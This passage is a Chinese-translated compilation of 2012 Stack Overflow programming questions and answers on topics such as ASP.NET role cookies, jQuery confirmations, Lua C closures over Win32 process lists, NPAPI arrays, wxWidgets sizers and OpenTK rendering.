</roleManager> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T19:33:52.220

尝试添加默认提供程序，因此从此：

```
<roleManager enabled="true" cookieName=".TestROLE" cookieProtection="None" cacheRolesInCookie="true" cookieTimeout="30" cookiePath="/" cookieRequireSSL="false" cookieSlidingExpiration="false" >
  <providers>
    <clear/>
    <add name="AspNetSqlRoleProvider" type="System.Web.Security.SqlRoleProvider" connectionStringName="ApplicationServices" applicationName="/" />
    <!--<add name="AspNetWindowsTokenRoleProvider" type="System.Web.Security.WindowsTokenRoleProvider" applicationName="/" />-->
  </providers>
</roleManager> 
```

对此：

```
<roleManager defaultProvider="AspNetSqlRoleProvider" enabled="true" cookieName=".TestROLE" cookieProtection="None" cacheRolesInCookie="true" cookieTimeout="30" cookiePath="/" cookieRequireSSL="false" cookieSlidingExpiration="false" >
  <providers>
    <clear/>
    <add name="AspNetSqlRoleProvider" type="System.Web.Security.SqlRoleProvider" connectionStringName="ApplicationServices" applicationName="/" />
    <!--<add name="AspNetWindowsTokenRoleProvider" type="System.Web.Security.WindowsTokenRoleProvider" applicationName="/" />-->
  </providers>
</roleManager> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T23:40:56.347

不幸的是，这是设计使然，因为 .NET 4.5 中的基础类型发生了变化。您可以关闭在 cookie 中存储用户角色以防止出现此问题 (http://msdn.microsoft.com/en-us/library/system.web.security.roles.cacherolesincookie.aspx)。

[https://connect.microsoft.com/VisualStudio/feedback/details/759157/net-4-5-binaryformatter-serialization-generates-too-long-string](https://connect.microsoft.com/VisualStudio/feedback/details/759157/net-4-5-binaryformatter-serialization-generates-too-long-string)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-01-17T14:21:35.047

供参考：

Microsoft 最近发布了修复此问题的更新。

请参阅[知识库文章 2750147](http://support.microsoft.com/kb/2750147)

# jquery - 关闭活动聊天窗口前的确认框

> ID：12078213
> 
> 赞同：0
> 
> 时间：2012-08-22T17:14:53.290
> 
> 标签：jquery, html

我制作了一个聊天窗口，用户可以在其中在我的网站上寻求支持。问题是，在他完成并想要关闭窗口之后，他按下了关闭聊天窗口的“X”。但是我在这里做了一个 div，它出现在屏幕中间，问他是否真的想关闭窗户。这是代码：

```
<div id="background">
<div id="stay">
<p style="font-family:Tahoma, Geneva, sans-serif;font-weight:600;font-size:19px;margin-top:10px;">Exiting the support window will delete all the conversation you had with the staff and will disconnect you from the conversation. </p>
<p style="font-family:Tahoma, Geneva, sans-serif;font-weight:600;font-size:19px;">Are you sure you want to exit ?</p>
<div id="agree">
<p>Yes</p>
</div>
<div id="cancel">
<p>No</p>
</div>
</div><!--stay end-->
</div><!--background end--> 
```

查询：

```
$("#exit").click(function() {
        $("#livesupport").hide();
        $('html, body').animate({scrollTop:0}, 'fast');
        $("#background").toggle();
        $("body").css({ 'overflow':'hidden' });
        $.post('utility/rchat.php', { table: sessid } , 
        function(getshiton) {
        });
}); 
```

“#livesupport”是聊天窗口。

如何让 No 成为答案，以便当用户按下它时它会返回到页面并且不对页面进行任何更改，并且当他按下 Yes 时，他会关闭支持窗口。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:29:21.907

我会使用一个弹出框，而不是你正在做的是和否，这很容易做到。您的代码如下所示：

```
$("#exit").click(function() {
    if(confirm("Are you sure you want to exit this window?")) {
        $("#livesupport").hide();
        $('html, body').animate({scrollTop:0}, 'fast');
        $("#background").toggle();
        $("body").css({ 'overflow':'hidden' });
        $.post('utility/rchat.php', { table: sessid } , 
        function(getshiton) {
        });
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:55:50.207

我不确定你们都在这里工作，但这是一个基本概念。您的自定义“确认”消息框将有两个按钮，默认情况下是隐藏的。

```
// USER CLICKED THE EXIT BUTTON
$("#exit").click(function() {
    /*  SHOW YOUR CUSTOM CONFIRM OVERLAY */
}

// CONFIRM BUTTON IS CLICKED
$("#confirmExitButton").click(function(){
   /* CLOSE THE CHAT */
});

//CANCEL BUTTON IS CLICKED
$("#cancelExitButton").click(function(){
   /* MAKE THE CONFIRM DISAPEAR */
}); 
```

# c++ - 如何在 Lua 中使用 Win32 迭代器？

> ID：12078220
> 
> 赞同：1
> 
> 时间：2012-08-22T17:15:14.090
> 
> 标签：c++, lua

我有一个使用 Lua 5.2.1 的 Visual Studio 2008 C++03 项目，我希望允许 Lua 脚本使用 Win32 迭代函数（FindFirst*、FindNext* 等...）

例如，我希望能够列出正在运行的进程：

```
#include <tlhelp32.h>
#pragma comment( lib, "toolhelp.lib" )

static int process_iter_next( lua_State* L )
{
    HANDLE h = *( HANDLE* )lua_touserdata( L, lua_upvalueindex( 1 ) );
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof( PROCESSENTRY32 );
    if( ::Process32Next( h, &pe ) )
    {
        lua_pushstring( L, pe.szExeFile );
        return 1;
    }
    return 0;
}

static int process_iter_first( lua_State* L )
{
    HANDLE h = *( HANDLE* )lua_touserdata( L, lua_upvalueindex( 1 ) );
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof( PROCESSENTRY32 );
    if( ::Process32First( h, &pe ) )
    {
        lua_pushstring( L, pe.szExeFile );

        // How do I replace the closure with process_iter_next?

        return 1;
    }
    return 0;
}

static int l_list( lua_State *L )
{
    HANDLE* h = ( HANDLE* )lua_newuserdata( L, sizeof( HANDLE ) );
    luaL_getmetatable( L, "process.list" );
    lua_setmetatable( L, -2 );

    *h = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0 );
    if( INVALID_HANDLE_VALUE == *h )
        luaL_error( L, "Failed to list processes. EC: %d", ::GetLastError() );

    lua_pushcclosure( L, process_iter_first, 1 );
    return 1;
}

static int process_gc( lua_State* L )
{
    HANDLE h = *( HANDLE* )lua_touserdata( L, 1 );
    if( INVALID_HANDLE_VALUE != h )
        ::CloseToolhelp32Snapshot( h );
    return 0;
}

extern "C" int luaopen_process( lua_State *L ) 
{
    static const luaL_Reg process[] = {
        { "list", l_list },
        { NULL, NULL }
    };

    luaL_newmetatable( L, "process.list" );
    lua_pushstring( L, "__gc" );
    lua_pushcfunction( L, process_gc );
    lua_settable( L, -3 );

    luaL_newlib( L, process );

    return 1;
} 
```

我的 Lua 脚本：

```
for p in process.list() do
    print(p)
end 
```

当我运行它时，只会`process_iter_first`调用 。如何将创建的 c-closure 替换为`l_list`when`process_iter_next`成功`Process32First`？

* * *

**根据@Mud 的建议进行编辑***

```
static int process_iter( lua_State* L )
{
    HANDLE h = *( HANDLE* )lua_touserdata( L, lua_upvalueindex( 1 ) );
    typedef BOOL ( *PFN_ProcessIter )( HANDLE, LPPROCESSENTRY32 );
    PFN_ProcessIter next = ( PFN_ProcessIter )lua_touserdata( L, lua_upvalueindex( 2 ) );

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof( PROCESSENTRY32 );
    if( next( h, &pe ) )
    {
        lua_pushstring( L, pe.szExeFile );

        lua_pushlightuserdata( L, Process32Next );

        // not sure how to use this function. The docs are not enlightening.
        // lua_setupvalue( L, ???, ??? );

        // This looked like a good idea from the docs, but it causes an access violation
        // lua_setuservalue( L, lua_upvalueindex( 2 ) );

        return 1;
    }
    return 0;
}

static int l_list( lua_State *L )
{
    HANDLE* h = ( HANDLE* )lua_newuserdata( L, sizeof( HANDLE ) );
    luaL_getmetatable( L, "process.list" );
    lua_setmetatable( L, -2 );

    *h = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0 );
    if( INVALID_HANDLE_VALUE == *h )
        luaL_error( L, "Failed to list processes. EC: %d", ::GetLastError() );

    lua_pushlightuserdata( L, Process32First );
    lua_pushcclosure( L, process_iter, 2 );
    return 1;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T19:09:18.813

只需将要调用的函数地址作为闭包 ( `lua_pushlightuserdata`) 的另一个上值推送，然后在第一次调用时更新它。

或者将您的用户数据更改为包含句柄和函数指针的结构，并在第一次调用时更新函数指针。

* * *

对 PaulH 编辑的回应：

```
static int process_iter( lua_State* L )
{
   HANDLE h = *( HANDLE* )lua_touserdata( L, lua_upvalueindex( 1 ) );
   typedef BOOL (WINAPI *PFN_ProcessIter )( HANDLE, LPPROCESSENTRY32 );
   PFN_ProcessIter next = ( PFN_ProcessIter )lua_touserdata( L, lua_upvalueindex( 2 ) );

   PROCESSENTRY32 pe;
   pe.dwSize = sizeof( PROCESSENTRY32 );
   if( next( h, &pe ) )
   {
      lua_pushstring( L, pe.szExeFile );

      if (next == Process32First)
      {
         lua_pushlightuserdata(L, Process32Next);
         lua_replace(L, lua_upvalueindex(2));
      }

      return 1;
   }
   return 0;
} 
```

# php - 从另一个控制器访问方法的 Zend Framework 问题

> ID：12078230
> 
> 赞同：0
> 
> 时间：2012-08-22T17:15:47.343
> 
> 标签：php, zend-framework, zend-controller

我一直在尝试使用 _forward 方法从另一个控制器访问我的 IndexController 中的方法，但它似乎不起作用。我试过了：

```
$this->_forward('permissions', 'Index')
$this->_forward('permissions', 'index')
$this->_forward('permissions', 'IndexController')
$this->_forward('permissions', 'indexcontroller') 
```

这些都没有奏效。这是我的代码。

控制器

```
class IndexController extends Zend_Controller_Action
{

    /**
     * facebookConfig
     * 
     * @var mixed
     * @access protected
     */
    protected $facebookConfig;

    /**
     * signed_request
     * 
     * @var mixed
     * @access protected
     */
    protected $signed_request;

    /**
     * facebookConfig
     * 
     * @var mixed
     * @access protected
     */
    protected $permissions;

    /**
     * init function.
     * 
     * @access public
     * @return void
     */
    public function init()
    {
        // get the model
        $this->app = new Application_Model_Admin();

        // get config data
        $this->facebookConfig =  $this->app->configData();

        // get the apps permissions
        $this->permissions = $this->permissions();

        // get the data for the head
        $data = $this->app->configData();
        if(empty($data->ogimage))
            $data->ogimage = '';

        // set the page title
        $this->view->headTitle($data->title, 'PREPEND');

        // set the meta data
        $this->view->headMeta()->setName('fb:app_id',       $data->appid);
        $this->view->headMeta()->setName('og:type',         $data->ogtype);
        $this->view->headMeta()->setName('og:title',        $data->ogtitle);
        $this->view->headMeta()->setName('og:description',  $data->ogdesc);
        $this->view->headMeta()->setName('og:url',          $data->applink);
        $this->view->headMeta()->setName('og:image',        $data->ogimage);
    }

    /**
     * permissions function.
     * 
     * @access public
     * @return void
     */
    public function permissions(){
        // return the permissions
        return 'publish_stream, read_stream, friends_likes';
    }

} 
```

第二控制器

```
<?php

class ThanksController extends Zend_Controller_Action
{

    /**
     * facebookConfig
     * 
     * @var mixed
     * @access protected
     */
    protected $permissions;

    /**
     * init function.
     * 
     * @access public
     * @return void
     */
    public function init()
    {
        // get the model

        // get the permissions
        $this->permissions = $this->_forward('permissions', 'index');
        print_r('<pre>');var_dump($this->_forward('permissions', 'index'));print_r('</pre>');die;

    }
 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:25:26.420

`_forward`仅用于调用控制器动作，而不是常规方法

`_forward('index')`实际上是指方法`indexAction()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T19:34:32.877

改变这个：

```
public function permissions(){
    // return the permissions
    return 'publish_stream, read_stream, friends_likes';
} 
```

对此：

```
public function permissionsAction(){
    // return the permissions
    return 'publish_stream, read_stream, friends_likes';
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-23T14:10:36.087

我并没有特别清楚地思考，而是将代码放在模型中并从他们那里访问数据。

# vb.net - vb.net从图像中提取文本

> ID：12078231
> 
> 赞同：1
> 
> 时间：2012-08-22T17:15:49.933
> 
> 标签：vb.net, winforms, bitmap, ocr

我想从图像中提取文本。例如：

![](../Images/7c0dec547ae3dddaf3ed338e8fc24216.png)

返回：`12345678910`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:19:26.243

您应该可以通过[Tessnet2](http://www.pixel-technology.com/freeware/tessnet2/)来做到这一点，它是围绕 Tesseract 引擎的开源包装器。

# javascript - 调用 top.document

> ID：12078236
> 
> 赞同：0
> 
> 时间：2012-08-22T17:16:33.373
> 
> 标签：javascript, jquery, parent

```
function RemoveOZELMESAJ(){
$('#OZELMESAJ').remove();
} 
```

这在 iframe 中使用我希望这项工作在顶部我如何在 jquery 中像这种用法一样工作有可能吗？

```
$(".loading",top.document)
RemoveOZELMESAJ() > working parente top ? 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:12:35.213

```
$('.loading', window.parent.document) 
```

# wpf - 在添加新记录时更新 XamDataGrid 的 ActiveDataItem

> ID：12078245
> 
> 赞同：3
> 
> 时间：2012-08-22T17:17:32.863
> 
> 标签：wpf, mvvm, infragistics, xamdatagrid

我正在使用带有 MVVM 架构的 WPF，我面临的问题是当我向网格添加新记录并按 Enter 时，该记录未设置为活动记录。只有当我单击其他记录，然后再次单击新记录时，它才会更新。

```
<igDP:XamDataGrid  Name="xamDataGrid1" Width="700" Height="200" HorizontalAlignment="Center" ActiveDataItem="{Binding Listener,Mode=TwoWay}"  DataSource="{Binding GridData.Tables[0].DefaultView}" Padding="50"> 
```

有没有办法可以将新添加的记录设置为 activedataitem 属性，以便它可以调用视图模型中的侦听器？我必须从视图模型中将新记录插入数据库中。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-20T12:00:52.820

首先为它制作一个集合`DataSource`并绑定它。接下来绑定`ActiveDataItem`. 在集合中，添加新元素。之后，您可以提供`ActiveDataItem`集合中的最后一个元素。

# facebook - Facebook 登录仅在主机设置为 localhost 时有效？

> ID：12078246
> 
> 赞同：5
> 
> 时间：2012-08-22T17:17:36.377
> 
> 标签：facebook, oauth-2.0, facebook-login, hosts, openshift

不幸的是，我不断收到此错误：

```
{
   "error": {
      "message": "Invalid redirect_uri: Given URL is not allowed by the Application configuration.",
      "type": "OAuthException",
      "code": 191
   }
} 
```

`/etc/hosts`但是，当我的文件设置为：时登录有效`127.0.0.1 [mysite].rhcloud.com`，仅当我查看实际的`[mysite].rhcloud.com`.

我在本地运行与在 rhcloud 上运行的应用程序完全相同的应用程序（在不同的服务器上）。具体来说，本地<->远程 Web 应用程序目录是同步的。

### 网址信息

尝试远程登录时，URL 如下所示；并因上述错误而失败：

https://graph.facebook.com/oauth/authorize?scope=user_photos%2Cfriends_photos&redirect_uri=http%3A%2F%2F[mypublicipaddress]%2Fuser%2Flogin&response_type=code&client_id=[隐藏]

尝试在本地登录时，URL 看起来像这样；和作品：

https://www.facebook.com/dialog/permissions.request?app_id=[hidden]&display=page&next=http%3A%2F%2F[hidden].rhcloud.com%2Fuser%2Flogin&response_type=code&perms=user_photos%2Cfriends_photos&fbconnect= 1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T05:13:10.330

好的，您似乎这样做是对的，但是有时会让人绊倒的一件事是，您的`redirect_uri`和“网站 URL”字段是否都有尾随的“/”？

特别是，如果`redirect_uri`域名后面没有尾随的“/”（或文件名等），它并不总是有效

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-28T10:10:06.947

您是否在 Facebook 应用程序配置中设置了您的画布 URL/安全画布 URL。如果是这样，请在删除它们后重试。或者在确保画布 URL 正确后尝试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-05T11:23:03.780

通过访问我的 facebook 开发人员应用程序帐户并将域从 localhost 更改为我的应用程序的 url，我能够克服完全相同的问题

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-28T10:37:11.070

是的。尾随`/`很重要。只需检查您的这些字段，`/`如果不存在则添加尾随。

但是，老实说，这是我第一次看到这样的事情。通常，我们`Facebook`会在本地环境中看到登录失败，但在生产环境中运行良好。

# visual-studio-2010 - 无法获取属性“h”的值：对象为空或未定义

> ID：12078247
> 
> 赞同：0
> 
> 时间：2012-08-22T17:17:36.167
> 
> 标签：visual-studio-2010, silverlight-5.0

尝试从 VisualStudio 2010 调试 Internet Explorer 9 中的 Silverlight 5 应用程序（当我开始从 vs2010 调试 SL5 时），我收到此错误：

```
Unable to get value of the property 'h': object is null or undefined. 
```

我的问题是：App.xaml.cs构造函数有调试停止红点，错误先弹出然后到这个调试点，之前执行的是什么？

在 VS2010 中，我单击“调试”>“开始调试”，然后我得到错误窗口“网页错误”作为标题，红色 x 你想调试这个网页吗？bla，bla，在白色区域是行：13 错误：无法获取属性“h”的值：对象为空或未定义。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T20:04:15.987

顺便修复错误...您可以尝试从IE上的运行页面注销。（只需转到右上角单击登录为的名称，然后（从下拉菜单中）单击注销。发生的事情是我登录到 gmail 并单击“保持登录”。如果我在运行中重新登录页面错误再次弹出。

仍然想知道我的问题的答案，寿。

# ios - 带有自定义 UITableView 的 UISearchBar

> ID：12078249
> 
> 赞同：0
> 
> 时间：2012-08-22T17:17:50.913
> 
> 标签：ios, uitableview, uisearchbar

我希望以下内容在 iOS4 中工作：

```
-(void)searchDisplayControllerDidBeginSearch:(UISearchDisplayController *)controller {
    controller.searchResultsTableView.allowsMultipleSelectionDuringEditing = YES;
} 
```

但是，`UITableView`不支持它。如何更改`searchResultsTableView`它以使其使用`UDTableView`(https://github.com/ud7/UDTableView-allowsMultipleSelection) 而不是`UITableView`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T10:49:25.480

我没有设法使用子类，但是在没有 UDTableView 的情况下，我得到了多个在搜索模式下工作的部分：

```
-(void)searchDisplayControllerDidBeginSearch:(UISearchDisplayController *)controller {

    if ([controller.searchResultsTableView respondsToSelector:@selector(allowsMultipleSelectionDuringEditing)]) {
        controller.searchResultsTableView.allowsMultipleSelectionDuringEditing = YES;
    }
    else {
        controller.searchResultsTableView.allowsSelectionDuringEditing = YES;
    }
}

- (UITableViewCellEditingStyle)tableView:(UITableView *)tableView editingStyleForRowAtIndexPath:(NSIndexPath *)indexPath
{
    return UITableViewCellAccessoryCheckmark;
} 
```

# npapi - 从 NPAPI 插件返回数组到 java 脚本

> ID：12078250
> 
> 赞同：3
> 
> 时间：2012-08-22T17:17:51.453
> 
> 标签：npapi

我想将字符串数组从 NPAPI 插件返回到 Javascript。目前我只使用普通的 NPAPI。我已阅读以下链接：

*   [NPVariant 到字符串数组](https://stackoverflow.com/questions/1896166/npvariant-to-string-array)
*   [http://www.m0interactive.com/archives/2010/10/21/how_to_communicate_back_to_javascript_from_npapi_plugin.html](http://www.m0interactive.com/archives/2010/10/21/how_to_communicate_back_to_javascript_from_npapi_plugin.html)

我能够将 alert() 从插件返回到 javascript，并且我可以获得 NPNVWindowObject，但我现在被困在弄清楚如何将元素推送到数组并将其返回给 javascript。

工作代码示例将不胜感激，谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T19:22:09.753

你已经很近了；你只需要填写一些细节。[FireBreath](http://firebreath.org)代码库有执行此操作的[示例](https://github.com/firebreath/FireBreath/blob/master/src/NpapiCore/NPVariantUtil.h#L138)，但实际实现有点抽象。我没有执行此操作的任何原始 NPAPI 代码；我在 FireBreath 中构建插件，在那里它几乎非常简单。不过，我可以告诉你你需要做什么。

如果你把它分解成几个步骤，问题就会变得更简单：

1.  获取窗口的 NPObject（听起来像你有这个）
2.  创建一个新数组并获取该数组的 NPObject
3.  为要发送到 DOM 的每个项目调用该 NPObject 上的“推送”
4.  保留数组的 NPObject 并在返回值 NPVariant 中返回

我将尝试一下您将用于这些的代码；可能会有一些小错误。

1) 获取窗口的 NPObject

```
// Get window object.
NPObject* window = NULL;
NPN_GetValue(npp_, NPNVWindowNPObject, &window);
// Remember that when we're done we need to NPN_ReleaseObject the window! 
```

2) 创建一个新数组并获取该数组的 NPObject

基本上，我们通过调用 window.Array() 来做到这一点，您可以通过在窗口上调用 Array 来做到这一点。

```
// Get the array object
NPObject* array = NULL;
NPVariant arrayVar;
NPN_Invoke(_npp, window, NPN_GetStringIdentifier("Array"), NULL, 0, &arrayVar);
array = arrayVar.value.objectValue;
// Note that we don't release the arrayVar because we'll be holding onto the pointer and returning it later 
```

3) 为要发送到 DOM 的每个项目调用该 NPObject 上的“推送”

```
NPIdentifier pushId = NPN_GetStringIdentifier("push");
for (std::vector<std::string>::iterator it = stringList.begin(); it != stringList.end(); ++it) {
    NPVariant argToPush;
    NPVariant res;
    STRINGN_TO_NPVARIANT(it->c_str(), it->size(), argToPush);
    NPN_Invoke(_npp, array, pushId, &argToPush, 1, &res);
    // Discard the result
    NPN_ReleaseVariantValue(&res);
} 
```

4）保留数组的NPObject，并在返回值NPVariant中返回

```
// Actually we don't need to retain the NPObject; we just won't release it. Same thing.
OBJECT_TO_NPVARIANT(array, *retVal);
// We're assuming that the NPVariant* param passed into this function is called retVal 
```

* * *

那应该差不多了。确保您了解内存管理的工作原理；如果还没有，请阅读[http://npapi.com/memory 。](http://npapi.com/memory)

祝你好运

# wxwidgets - wxWidgets对齐问题

> ID：12078256
> 
> 赞同：0
> 
> 时间：2012-08-22T17:18:06.757
> 
> 标签：wxwidgets

我想用 wxWidgets 创建顶部列表框的窗口，当您更改窗口大小时，它的大小会发生变化。下面是三个按钮，当窗口大小改变时，它们的大小不会改变。按钮和列表框之间的距离不断变化，并且在调整窗口大小时不会改变。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:38:41.693

`wx.BoxSizer`你想要一个具有比例`1`和`wx.EXPAND`标志的垂直。这个 sizer 将在你的列表框中，添加比例`1`和`wx.EXPAND`标志。这个 sizer 里面还有一个水平的 box sizer，里面添加了三个按钮。你想对`window.SetSizer(<your vertical sizer>)`你提到的“窗口”做 a （可能是 a `wx.Frame`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T09:49:25.203

```
void SizerTest::CreateControls()
{    
////@begin SizerTest content construction
    SizerTest* itemFrame1 = this;

    wxBoxSizer* itemBoxSizer2 = new wxBoxSizer(wxVERTICAL);
    itemFrame1->SetSizer(itemBoxSizer2);

    wxArrayString itemListBox3Strings;
    wxListBox* itemListBox3 = new wxListBox( itemFrame1, ID_LISTBOX2, wxDefaultPosition, wxDefaultSize, itemListBox3Strings, wxLB_SINGLE );
    itemBoxSizer2->Add(itemListBox3, 1, wxGROW|wxLEFT|wxRIGHT|wxTOP, 5);

    wxBoxSizer* itemBoxSizer4 = new wxBoxSizer(wxHORIZONTAL);
    itemBoxSizer2->Add(itemBoxSizer4, 0, wxALIGN_LEFT, 0);

    wxButton* itemButton5 = new wxButton( itemFrame1, ID_BUTTON3, _("Button"), wxDefaultPosition, wxDefaultSize, 0 );
    itemBoxSizer4->Add(itemButton5, 0, wxALIGN_CENTER_VERTICAL|wxALL, 5);

    wxButton* itemButton6 = new wxButton( itemFrame1, ID_BUTTON4, _("Button"), wxDefaultPosition, wxDefaultSize, 0 );
    itemBoxSizer4->Add(itemButton6, 0, wxALIGN_CENTER_VERTICAL|wxALL, 5);

    wxButton* itemButton7 = new wxButton( itemFrame1, ID_BUTTON5, _("Button"), wxDefaultPosition, wxDefaultSize, 0 );
    itemBoxSizer4->Add(itemButton7, 0, wxALIGN_CENTER_VERTICAL|wxALL, 5);

////@end SizerTest content construction
} 
```

应该是这样的：[http ://screencast.com/t/ZonUBhPZ7](http://screencast.com/t/ZonUBhPZ7)

[调整大小： http](http://screencast.com/t/zRDpDix7Yr) ://screencast.com/t/zRDpDix7Yr

# android - Titanium中的Android视频控制位置

> ID：12078257
> 
> 赞同：4
> 
> 时间：2012-08-22T17:18:13.227
> 
> 标签：android, titanium, appcelerator, android-mediaplayer

我对 android 视频控件有疑问。我有一个视频播放器，它是设备高度的一半，位于`top:0`

当视频控件弹出时，它们位于视频播放器下方，从而覆盖了视频播放器下方的内容。我想做的是将控件放置在视频的顶部，但仍位于底部。iOS 视频播放器的工作方式相同。

现在控件基本上在视频播放器的高度之外。当我在本地开发 Android 时，我遇到了同样的问题，并通过使用`setAnchorView`Java 中的方法修复了它。我还没有在钛金属中看到过这样的东西。这甚至可能吗？

我尝试将播放器包装在一个视图中，它产生了相同的结果。

```
var deviceWidth = Ti.Platform.displayCaps.platformWidth;
var deviceHeight = Ti.Platform.displayCaps.platformHeight;

var vidPlayer = Ti.Media.createVideoPlayer({
    width:deviceWidth,
    height:deviceHeight / 2,
    top:0,
    backgroundColor:'#ffffff',
    autoplay:false
});
win.add(vidPlayer); 
```

这是我正在谈论的图像

![边界框外的视频控件](../Images/56325183cb26665a48009e423770e748.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T15:15:57.297

将媒体控件样式设置为嵌入视频播放器：

```
mediaControlStyle: Ti.Media.VIDEO_CONTROL_EMBEDDED 
```

在幕后，这设置了锚视图。 [https://github.com/appcelerator/titanium_mobile/blob/master/android/modules/media/src/java/ti/modules/titanium/media/TiUIVideoView.java#L211](https://github.com/appcelerator/titanium_mobile/blob/master/android/modules/media/src/java/ti/modules/titanium/media/TiUIVideoView.java#L211)

Ti.Media.VideoPlayer.mediaControlStyle 的文档：[http ://docs.appcelerator.com/titanium/2.1/index.html#!/api/Titanium.Media.VideoPlayer-property-mediaControlStyle](http://docs.appcelerator.com/titanium/2.1/index.html#!/api/Titanium.Media.VideoPlayer-property-mediaControlStyle)

Ti.Media.VIDEO_CONTROL_EMBEDDED 的文档：[http ://docs.appcelerator.com/titanium/2.1/index.html#!/api/Titanium.Media-property-VIDEO_CONTROL_EMBEDDED](http://docs.appcelerator.com/titanium/2.1/index.html#!/api/Titanium.Media-property-VIDEO_CONTROL_EMBEDDED)

# c# - OpenGL不会同时渲染无纹理和有纹理的形状

> ID：12078263
> 
> 赞同：1
> 
> 时间：2012-08-22T17:18:43.773
> 
> 标签：c#, c++, opengl, opentk

我有两个 VBO。其中一个有纹理，另一个没有。我没有成功地将它们同时绘制到屏幕上。DrawQuad 绘制无纹理的，DrawQuadTex 绘制有纹理的，两者的代码类似于以下：

```
// Enable/Disable GL_TEXTURE_2D depending on which I'm drawing
// Bind/Unbind the texture

GL.EnableClientState(ArrayCap.VertexArray);
GL.BindBuffer(BufferTarget.ArrayBuffer, _vertexBufferId);
GL.VertexPointer(2, VertexPointerType.Float, Vector2.SizeInBytes, IntPtr.Zero);
GL.BindBuffer(BufferTarget.ElementArrayBuffer, _indexBufferId);

GL.DrawElements(BeginMode.Triangles, _indices.Length, DrawElementsType.UnsignedByte, 0); 
```

无论首先调用这两个函数中的哪一个，该形状都是可见的（即，如果我调用 DrawQuad，那么一个无纹理的四边形是可见的）。

我确实在 GL_TEXTURE_2D 上设置了 glDisable 并尝试关闭 TexCoordArray 并尝试将纹理绑定到 0，但没有任何区别。有什么我忽略的吗？

# SSCCE

```
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using OpenTK;
using OpenTK.Graphics.OpenGL;

namespace E04
{
    internal class Renderer
    {
        private readonly Int32 _vertexBufferId;
        private readonly Int32 _textureBufferId;
        private readonly Int32 _indexBufferId;
        private readonly Int32 _colorBufferId;
        private readonly Int32 _normalBufferId;

        private readonly Vector2[] _vertices;
        private readonly Vector2[] _textureCoordinates;
        private readonly Byte[] _indices;
        private readonly Vector4[] _colors;
        private readonly Vector3[] _normals;

        public Renderer()
        {
            // Create a vertex array
            _vertices = new Vector2[4];

            // Set the coordinate data
            _textureCoordinates = new Vector2[4];
            _textureCoordinates[0].X = 0.0f;
            _textureCoordinates[0].Y = 0.0f;
            _textureCoordinates[1].X = 1.0f;
            _textureCoordinates[1].Y = 0.0f;
            _textureCoordinates[2].X = 0.0f;
            _textureCoordinates[2].Y = 1.0f;
            _textureCoordinates[3].X = 1.0f;
            _textureCoordinates[3].Y = 1.0f;

            // Set the index data
            _indices = new Byte[6];
            _indices[0] = 0;
            _indices[1] = 1;
            _indices[2] = 3;
            _indices[3] = 3;
            _indices[4] = 2;
            _indices[5] = 0;

            // Set the color data
            _colors = new Vector4[4];
            _colors[0] = new Vector4(1.0f, 0.0f, 0.0f, 1.0f);
            _colors[1] = new Vector4(1.0f, 1.0f, 0.0f, 1.0f);
            _colors[2] = new Vector4(0.0f, 1.0f, 0.0f, 1.0f);
            _colors[3] = new Vector4(0.0f, 0.0f, 1.0f, 1.0f);

            // Set the normal data
            _normals = new Vector3[4];
            _normals[0] = new Vector3(0.0f, 0.0f, 1.0f);
            _normals[1] = new Vector3(0.0f, 0.0f, 1.0f);
            _normals[2] = new Vector3(0.0f, 0.0f, 1.0f);
            _normals[3] = new Vector3(0.0f, 0.0f, 1.0f);

            // Bind the texture array buffer
            GL.GenBuffers(1, out _textureBufferId);
            GL.BindBuffer(BufferTarget.ArrayBuffer, _textureBufferId);
            GL.BufferData(BufferTarget.ArrayBuffer, (IntPtr) (_textureCoordinates.Length*Vector2.SizeInBytes),
                          _textureCoordinates, BufferUsageHint.DynamicDraw);
            GL.TexCoordPointer(2, TexCoordPointerType.Float, 8, IntPtr.Zero);
            GL.EnableClientState(ArrayCap.TextureCoordArray);
            GL.BindBuffer(BufferTarget.ArrayBuffer, 0);

            // Bind the normal array buffer
            GL.GenBuffers(1, out _normalBufferId);
            GL.BindBuffer(BufferTarget.ArrayBuffer, _normalBufferId);
            GL.BufferData(BufferTarget.ArrayBuffer, (IntPtr) (_normals.Length*Vector3.SizeInBytes), _normals,
                          BufferUsageHint.StaticDraw);
            GL.BindBuffer(BufferTarget.ArrayBuffer, 0);

            // Bind the color array buffer
            GL.GenBuffers(1, out _colorBufferId);
            GL.BindBuffer(BufferTarget.ArrayBuffer, _colorBufferId);
            GL.BufferData(BufferTarget.ArrayBuffer, (IntPtr) (_colors.Length*Vector4.SizeInBytes), _colors,
                          BufferUsageHint.StaticDraw);
            GL.BindBuffer(BufferTarget.ArrayBuffer, 0);

